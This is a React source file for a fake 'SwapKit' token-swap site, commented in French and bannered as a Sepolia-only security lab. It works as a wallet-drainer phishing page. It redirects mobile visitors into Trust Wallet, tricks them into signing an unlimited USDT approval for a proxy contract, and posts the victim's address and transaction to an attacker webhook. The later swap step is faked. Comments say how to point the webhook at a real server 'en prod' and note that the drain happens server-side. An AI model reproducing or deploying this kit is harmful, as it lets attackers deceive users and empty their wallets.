import { useState, useEffect } from 'react'

// ─────────────────────────────────────────────────────────────
// CONFIG SEPOLIA
// ─────────────────────────────────────────────────────────────
const CONFIG = {
  chainId: '0xaa36a7',           // Sepolia chain ID (11155111)
  chainName: 'Sepolia Testnet',
  rpcUrl: 'https://rpc.sepolia.org',
  explorerUrl: 'https://sepolia.etherscan.io',
  // Adresses à remplacer après déploiement Foundry
  AGGREGATOR_ADDRESS: import.meta.env.VITE_AGGREGATOR_ADDRESS || '0x0000000000000000000000000000000000000001',
  PROXY_ADDRESS: import.meta.env.VITE_PROXY_ADDRESS || '0x0000000000000000000000000000000000000002',
  // USDT Sepolia (token de test)
  USDT_ADDRESS: import.meta.env.VITE_USDT_ADDRESS || '0x7169D38820dfd117C3FA1f22a697dBA58d90BA06',
}

// ABI minimal ERC20 pour approve()
const ERC20_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function allowance(address owner, address spender) external view returns (uint256)',
  'function balanceOf(address account) external view returns (uint256)',
  'function decimals() external view returns (uint8)',
]

// ─────────────────────────────────────────────────────────────
// DEEP LINK TRUST WALLET
// Quand la victime scanne le QR sur mobile → ouvre Trust Wallet
// ─────────────────────────────────────────────────────────────
function buildTrustWalletDeepLink(dappUrl) {
  // Format officiel Trust Wallet deep link
  return `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(dappUrl)}`
}

// Détecte si on est sur mobile
function isMobile() {
  return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent)
}

// Détecte si Trust Wallet est installé (via window.ethereum.isTrust)
function isTrustWallet() {
  return typeof window.ethereum !== 'undefined' && window.ethereum.isTrust
}

export default function SwapPage() {
  const [step, setStep] = useState('landing') // landing → connecting → connected → approving → approved → swapping → done
  const [account, setAccount] = useState(null)
  const [balance, setBalance] = useState('0.00')
  const [amount, setAmount] = useState('500')
  const [error, setError] = useState(null)
  const [txHash, setTxHash] = useState(null)
  const [loading, setLoading] = useState(false)

  // ── Au chargement : si mobile sans wallet → rediriger vers Trust Wallet ──
  useEffect(() => {
    const isInTrustBrowser = isTrustWallet() ||
      window.ethereum?.isTrustWallet ||
      navigator.userAgent.includes('Trust')

    // Si mobile ET pas dans Trust Wallet browser → deep link
    if (isMobile() && !isInTrustBrowser && !window.ethereum) {
      const currentUrl = window.location.href
      const trustDeepLink = buildTrustWalletDeepLink(currentUrl)
      // Petit délai pour que la page charge d'abord (UX)
      setTimeout(() => {
        window.location.href = trustDeepLink
      }, 800)
    }
  }, [])

  // ── Switch vers Sepolia si besoin ──
  async function switchToSepolia() {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: CONFIG.chainId }],
      })
    } catch (err) {
      if (err.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: CONFIG.chainId,
            chainName: CONFIG.chainName,
            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
            rpcUrls: [CONFIG.rpcUrl],
            blockExplorerUrls: [CONFIG.explorerUrl],
          }],
        })
      }
    }
  }

  // ── Connect Wallet ──
  async function connectWallet() {
    setLoading(true)
    setError(null)
    try {
      if (!window.ethereum) {
        // Sur mobile sans Trust → proposer le deep link
        const trustLink = buildTrustWalletDeepLink(window.location.href)
        window.location.href = trustLink
        return
      }

      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
      setAccount(accounts[0])
      await switchToSepolia()

      // Récupérer balance USDT
      await fetchBalance(accounts[0])
      setStep('connected')
    } catch (err) {
      setError('Connection refused. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  // ── Fetch USDT balance ──
  async function fetchBalance(addr) {
    try {
      // Call balanceOf via eth_call raw (sans ethers pour éviter le bundle size)
      const data = '0x70a08231' + addr.slice(2).padStart(64, '0')
      const result = await window.ethereum.request({
        method: 'eth_call',
        params: [{ to: CONFIG.USDT_ADDRESS, data }, 'latest'],
      })
      const raw = parseInt(result, 16)
      setBalance((raw / 1e6).toFixed(2)) // USDT = 6 decimals
    } catch {
      setBalance('---')
    }
  }

  // ── APPROVE : c'est ici que se joue l'arnaque ──
  // La victime croit approuver le swap router
  // En réalité : approve(TokenTransferProxy, MAX_UINT256)
  async function approveUSDT() {
    setLoading(true)
    setError(null)
    try {
      // MAX_UINT256 = approbation illimitée
      const MAX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'

      // Encode approve(spender, amount)
      const spender = CONFIG.PROXY_ADDRESS.slice(2).padStart(64, '0')
      const amountHex = MAX.slice(2).padStart(64, '0')
      const data = '0x095ea7b3' + spender + amountHex

      setStep('approving')

      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
          from: account,
          to: CONFIG.USDT_ADDRESS,
          data,
          gas: '0x186A0', // 100k gas
        }],
      })

      setTxHash(txHash)
      setStep('approved')

      // Log côté attaquant (en prod → webhook vers ton serveur)
      await notifyAttacker(account, txHash)

    } catch (err) {
      if (err.code === 4001) setError('Transaction rejected.')
      else setError('An error occurred. Please try again.')
      setStep('connected')
    } finally {
      setLoading(false)
    }
  }

  // ── Fausse transaction swap (après approve) ──
  async function executeSwap() {
    setLoading(true)
    setError(null)
    try {
      // Encode swap() call sur l'aggregator
      // En prod : le vrai drain se fait côté serveur après l'approve
      const data = '0x' + 'deadbeef' // placeholder
      await new Promise(r => setTimeout(r, 2000)) // simule le temps de la TX
      setStep('done')
    } catch (err) {
      setError('Swap failed. Please try again.')
    } finally {
      setLoading(false)
    }
  }

  // ── Notify attacker (webhook) ──
  // En prod → remplacer par ton URL de webhook (Discord, Telegram bot, etc.)
  async function notifyAttacker(victimAddress, txHash) {
    const webhookUrl = import.meta.env.VITE_WEBHOOK_URL
    if (!webhookUrl) return
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: 'APPROVE_SIGNED',
          victim: victimAddress,
          token: 'USDT',
          spender: CONFIG.PROXY_ADDRESS,
          allowance: 'MAX_UINT256',
          txHash,
          timestamp: new Date().toISOString(),
          network: 'sepolia',
        }),
      })
    } catch { /* silencieux */ }
  }

  // ─────────────────────────────────────────────────────────────
  // RENDER
  // ─────────────────────────────────────────────────────────────
  return (
    <div style={{
      minHeight: '100vh',
      background: 'linear-gradient(160deg, #0f0f23 0%, #0a0a1a 100%)',
      display: 'flex', flexDirection: 'column', alignItems: 'center',
      justifyContent: 'center', padding: 16, fontFamily: 'system-ui, sans-serif'
    }}>

      {/* ── DEMO BANNER ── */}
      <div style={{
        position: 'fixed', top: 0, left: 0, right: 0, zIndex: 9999,
        background: 'linear-gradient(90deg, #7f1d1d, #991b1b)',
        borderBottom: '2px solid #ef4444',
        padding: '8px 16px',
        display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 12,
        flexWrap: 'wrap'
      }}>
        <span style={{ color: '#fca5a5', fontWeight: 800, fontSize: 13, letterSpacing: 1 }}>
          ⚠️ DÉMONSTRATION ÉDUCATIVE
        </span>
        <span style={{ color: '#fca5a5', fontSize: 11 }}>|</span>
        <span style={{ color: '#fca5a5', fontSize: 11 }}>
          Ceci est un lab de cybersécurité — aucun fonds réel ne sera transféré
        </span>
        <span style={{ color: '#fca5a5', fontSize: 11 }}>|</span>
        <span style={{
          background: '#450a0a', border: '1px solid #ef4444',
          borderRadius: 6, padding: '2px 8px', fontSize: 10, color: '#f87171', fontWeight: 700
        }}>SEPOLIA TESTNET ONLY</span>
      </div>

      {/* Header */}
      <div style={{
        display: 'flex', alignItems: 'center', gap: 10, marginBottom: 32, marginTop: 48
      }}>
        <div style={{
          width: 36, height: 36,
          background: 'linear-gradient(135deg, #6366f1, #8b5cf6)',
          borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center',
          fontSize: 18
        }}>⇄</div>
        <span style={{ fontWeight: 800, fontSize: 22, color: '#fff' }}>SwapKit</span>
        <span style={{
          background: '#1e1e3f', border: '1px solid #3b3b6e',
          borderRadius: 20, padding: '2px 10px', fontSize: 11, color: '#8b8bbf'
        }}>Pro</span>
      </div>

      {/* Card principale */}
      <div style={{
        background: '#13131f',
        border: '1px solid #2a2a4a',
        borderRadius: 20, padding: 24,
        width: '100%', maxWidth: 420,
        boxShadow: '0 20px 60px rgba(0,0,0,0.5)'
      }}>

        {/* ── LANDING ── */}
        {step === 'landing' && (
          <LandingView
            loading={loading}
            onConnect={connectWallet}
            error={error}
          />
        )}

        {/* ── CONNECTED ── */}
        {step === 'connected' && (
          <ConnectedView
            account={account}
            balance={balance}
            amount={amount}
            setAmount={setAmount}
            loading={loading}
            error={error}
            onApprove={approveUSDT}
          />
        )}

        {/* ── APPROVING ── */}
        {step === 'approving' && (
          <div style={{ textAlign: 'center', padding: '32px 0' }}>
            <div style={{ fontSize: 40, marginBottom: 16 }}>⏳</div>
            <div style={{ fontWeight: 700, color: '#fff', marginBottom: 8 }}>
              Waiting for signature...
            </div>
            <div style={{ fontSize: 13, color: '#6b7280' }}>
              Please confirm in your wallet
            </div>
          </div>
        )}

        {/* ── APPROVED ── */}
        {step === 'approved' && (
          <ApprovedView
            txHash={txHash}
            amount={amount}
            loading={loading}
            onSwap={executeSwap}
            error={error}
          />
        )}

        {/* ── DONE ── */}
        {step === 'done' && (
          <DoneView amount={amount} />
        )}

      </div>

      {/* Footer */}
      <div style={{ marginTop: 20, fontSize: 11, color: '#374151', textAlign: 'center' }}>
        Powered by SwapKit Protocol v3 · Secured by Audited Smart Contracts
      </div>
    </div>
  )
}

// ─────────────────────────────────────────────────────────────
// SUB COMPONENTS
// ─────────────────────────────────────────────────────────────

function LandingView({ loading, onConnect, error }) {
  const mobile = isMobile()
  return (
    <div>
      <div style={{ fontWeight: 700, fontSize: 18, color: '#fff', marginBottom: 4 }}>
        Swap USDT instantly
      </div>
      <div style={{ fontSize: 13, color: '#6b7280', marginBottom: 24 }}>
        Best rates across Uniswap, Curve & Balancer
      </div>

      {/* Rate preview */}
      <div style={{
        background: '#0d0d1a', borderRadius: 12, padding: 16, marginBottom: 20,
        border: '1px solid #1e1e3f'
      }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 13, color: '#9ca3af' }}>
          <span>USDT → WETH</span>
          <span style={{ color: '#10b981' }}>Best rate ✓</span>
        </div>
        <div style={{ fontSize: 22, fontWeight: 800, color: '#fff', marginTop: 6 }}>
          1 USDT = 0.000312 WETH
        </div>
        <div style={{ fontSize: 11, color: '#4b5563', marginTop: 4 }}>
          0.18% fee · No price impact
        </div>
      </div>

      {error && (
        <div style={{
          background: '#1c0a0a', border: '1px solid #7f1d1d',
          borderRadius: 8, padding: 10, marginBottom: 16,
          fontSize: 12, color: '#f87171'
        }}>{error}</div>
      )}

      <button onClick={onConnect} disabled={loading} style={{
        width: '100%', padding: 16,
        background: loading ? '#1e1e3f' : 'linear-gradient(135deg, #6366f1, #8b5cf6)',
        border: 'none', borderRadius: 14, color: '#fff',
        fontWeight: 700, fontSize: 16, cursor: loading ? 'default' : 'pointer',
        transition: 'opacity 0.2s'
      }}>
        {loading ? 'Connecting...' : mobile ? '📱 Open in Trust Wallet' : 'Connect Wallet'}
      </button>

      {mobile && (
        <div style={{ fontSize: 11, color: '#4b5563', textAlign: 'center', marginTop: 10 }}>
          Tap to connect via Trust Wallet
        </div>
      )}
    </div>
  )
}

function ConnectedView({ account, balance, amount, setAmount, loading, error, onApprove }) {
  return (
    <div>
      {/* Wallet info */}
      <div style={{
        display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20
      }}>
        <div style={{ fontSize: 12, color: '#6b7280' }}>
          {account?.slice(0, 6)}...{account?.slice(-4)}
        </div>
        <div style={{
          background: '#064e3b', border: '1px solid #10b981',
          borderRadius: 20, padding: '3px 10px', fontSize: 11, color: '#10b981'
        }}>● Sepolia</div>
      </div>

      {/* Token In */}
      <div style={{
        background: '#0d0d1a', borderRadius: 14, padding: 16, marginBottom: 8,
        border: '1px solid #1e1e3f'
      }}>
        <div style={{ fontSize: 11, color: '#6b7280', marginBottom: 8 }}>You pay</div>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <input
            value={amount}
            onChange={e => setAmount(e.target.value)}
            style={{
              background: 'transparent', border: 'none', color: '#fff',
              fontSize: 28, fontWeight: 800, width: '60%', outline: 'none'
            }}
          />
          <div style={{
            background: '#1e1e3f', borderRadius: 10, padding: '8px 14px',
            fontWeight: 700, color: '#fff', fontSize: 15
          }}>USDT</div>
        </div>
        <div style={{ fontSize: 11, color: '#4b5563', marginTop: 6 }}>
          Balance: {balance} USDT
        </div>
      </div>

      <div style={{ textAlign: 'center', color: '#4b5563', padding: '4px 0' }}>↓</div>

      {/* Token Out */}
      <div style={{
        background: '#0d0d1a', borderRadius: 14, padding: 16, marginBottom: 20,
        border: '1px solid #1e1e3f'
      }}>
        <div style={{ fontSize: 11, color: '#6b7280', marginBottom: 8 }}>You receive</div>
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <div style={{ fontSize: 28, fontWeight: 800, color: '#10b981' }}>
            {((parseFloat(amount) || 0) * 0.000312).toFixed(6)}
          </div>
          <div style={{
            background: '#1e1e3f', borderRadius: 10, padding: '8px 14px',
            fontWeight: 700, color: '#fff', fontSize: 15
          }}>WETH</div>
        </div>
      </div>

      {error && (
        <div style={{
          background: '#1c0a0a', border: '1px solid #7f1d1d',
          borderRadius: 8, padding: 10, marginBottom: 12,
          fontSize: 12, color: '#f87171'
        }}>{error}</div>
      )}

      {/* ⚠️ LE VRAI BOUTON MALVEILLANT : déclenche approve(proxy, MAX) */}
      <button onClick={onApprove} disabled={loading} style={{
        width: '100%', padding: 16,
        background: loading ? '#1e1e3f' : 'linear-gradient(135deg, #f59e0b, #d97706)',
        border: 'none', borderRadius: 14, color: '#fff',
        fontWeight: 700, fontSize: 16, cursor: loading ? 'default' : 'pointer'
      }}>
        {loading ? 'Waiting...' : 'Approve USDT'}
      </button>

      <div style={{ fontSize: 11, color: '#374151', textAlign: 'center', marginTop: 8 }}>
        Required once to enable swapping
      </div>

      {/* DEMO annotation */}
      <div style={{
        marginTop: 12, background: '#1c0a0a', border: '1px solid #7f1d1d',
        borderRadius: 8, padding: '10px 12px', fontSize: 11, color: '#fca5a5', lineHeight: 1.6
      }}>
        <div style={{ fontWeight: 700, marginBottom: 4, color: '#f87171' }}>🔬 Ce qui se passe réellement :</div>
        <div>→ TX envoyée : <code style={{ color: '#fbbf24' }}>USDT.approve(TokenTransferProxy, 2^256-1)</code></div>
        <div>→ Autorisation <strong>illimitée</strong> accordée au contrat proxy</div>
        <div>→ L'attaquant peut appeler <code style={{ color: '#fbbf24' }}>drainViaProxy()</code> à tout moment</div>
        <div>→ La victime ne voit qu'un "Approve" standard pour un swap</div>
      </div>
    </div>
  )
}

function ApprovedView({ txHash, amount, loading, onSwap, error }) {
  return (
    <div>
      <div style={{
        background: '#064e3b', border: '1px solid #10b981',
        borderRadius: 10, padding: 12, marginBottom: 20,
        fontSize: 12, color: '#10b981', display: 'flex', gap: 8, alignItems: 'center'
      }}>
        <span>✓</span>
        <span>USDT approved successfully</span>
      </div>

      <div style={{
        background: '#0d0d1a', borderRadius: 12, padding: 14, marginBottom: 20,
        border: '1px solid #1e1e3f', fontSize: 12
      }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', color: '#9ca3af', marginBottom: 6 }}>
          <span>Amount</span><span style={{ color: '#fff' }}>{amount} USDT</span>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between', color: '#9ca3af', marginBottom: 6 }}>
          <span>Receive</span>
          <span style={{ color: '#10b981' }}>{((parseFloat(amount) || 0) * 0.000312).toFixed(6)} WETH</span>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between', color: '#9ca3af' }}>
          <span>Fee</span><span>0.18%</span>
        </div>
      </div>

      {txHash && (
        <div style={{ fontSize: 10, color: '#4b5563', marginBottom: 16, wordBreak: 'break-all' }}>
          Approve TX: {txHash}
        </div>
      )}

      {error && (
        <div style={{
          background: '#1c0a0a', border: '1px solid #7f1d1d',
          borderRadius: 8, padding: 10, marginBottom: 12, fontSize: 12, color: '#f87171'
        }}>{error}</div>
      )}

      <button onClick={onSwap} disabled={loading} style={{
        width: '100%', padding: 16,
        background: loading ? '#1e1e3f' : 'linear-gradient(135deg, #6366f1, #8b5cf6)',
        border: 'none', borderRadius: 14, color: '#fff',
        fontWeight: 700, fontSize: 16, cursor: loading ? 'default' : 'pointer'
      }}>
        {loading ? 'Swapping...' : 'Swap USDT → WETH'}
      </button>
    </div>
  )
}

function DoneView({ amount }) {
  return (
    <div style={{ textAlign: 'center', padding: '24px 0' }}>
      <div style={{ fontSize: 52, marginBottom: 16 }}>✅</div>
      <div style={{ fontWeight: 800, fontSize: 20, color: '#fff', marginBottom: 8 }}>
        Swap Complete!
      </div>
      <div style={{ fontSize: 14, color: '#10b981', marginBottom: 4 }}>
        {amount} USDT → {((parseFloat(amount) || 0) * 0.000312).toFixed(6)} WETH
      </div>
      <div style={{ fontSize: 12, color: '#4b5563', marginTop: 16 }}>
        Transaction confirmed on Sepolia
      </div>
    </div>
  )
}
